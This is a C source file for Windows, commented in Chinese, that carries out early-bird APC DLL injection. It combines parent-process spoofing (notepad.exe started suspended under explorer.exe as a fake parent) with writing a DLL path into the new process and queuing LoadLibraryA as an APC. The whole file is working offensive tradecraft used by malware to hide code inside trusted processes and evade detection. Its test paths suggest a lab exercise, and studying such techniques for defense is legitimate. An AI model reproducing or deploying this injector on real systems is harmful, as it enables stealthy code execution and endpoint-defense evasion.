#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetPidByName(const wchar_t* name) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (_wcsicmp(entry.szExeFile, name) == 0) {
                CloseHandle(snapshot); //thanks to Pvt Comfy
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}

int main() {
    // --- 配置 ---
    const char* targetPath = "C:\\Windows\\System32\\notepad.exe";
    const wchar_t* parentName = L"explorer.exe";
    const char* dllPath = "F:\\Test\\InjectDll.dll";

    // 初始化句柄和资源指针，方便统一清理
    HANDLE hParent = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
    LPVOID remoteBuf = NULL;
    BOOL bSuccess = FALSE;

    do {
        // 1. 获取父进程句柄
        DWORD parentPid = GetPidByName(parentName);
        if (parentPid == 0) {
            printf("[-] 找不到父进程: %s\n", parentName);
            break;
        }

        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
        if (!hParent) {
            printf("[-] OpenProcess 失败: %d\n", GetLastError());
            break;
        }

        // 2. 初始化属性列表 (用于父进程欺骗)
        SIZE_T attributeSize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
        if (!lpAttributeList) break;

        if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize)) break;

        if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
            printf("[-] 属性更新失败: %d\n", GetLastError());
            break;
        }

        // 3. 创建挂起的进程
        STARTUPINFOEXA siex = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        siex.lpAttributeList = lpAttributeList;

        if (!CreateProcessA(NULL, (LPSTR)targetPath, NULL, NULL, FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            NULL, NULL, &siex.StartupInfo, &pi)) {
            printf("[-] 进程创建失败: %d\n", GetLastError());
            break;
        }

        hProcess = pi.hProcess;
        hThread = pi.hThread;
        printf("[+] 目标进程已创建 (PID: %d)\n", pi.dwProcessId);

        // 4. 注入 DLL 路径字符串
        SIZE_T pathLen = strlen(dllPath) + 1;
        remoteBuf = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBuf)
        {
            printf("[-] 分配内存失败: %d\n", GetLastError());
            break;
        }

        if (!WriteProcessMemory(hProcess, remoteBuf, dllPath, pathLen, NULL))
        {
            printf("[-] 写入内存失败: %d\n", GetLastError());
            break;
        }

        // 5. 获取 LoadLibraryA 地址并入队 APC (早鸟注入核心)
        FARPROC pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (!pLoadLibrary)
        {
            printf("[-] 获取LoadLibraryA函数地址失败: %d\n", GetLastError());
            break;
        }

        if (!QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)remoteBuf)) {
            printf("[-] APC 入队失败\n");
            break;
        }

        // 6. 恢复线程
        ResumeThread(hThread);
        bSuccess = TRUE;
        printf("[+] 注入指令已提交，线程已恢复执行\n");

    } while (0);

    // --- 统一清理资源 ---
    if (!bSuccess && hProcess) {
        TerminateProcess(hProcess, 0); // 如果中间失败，清理掉创建的进程
    }
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    if (lpAttributeList) {
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
    }
    if (hParent) CloseHandle(hParent);

    return bSuccess ? 0 : 1;
}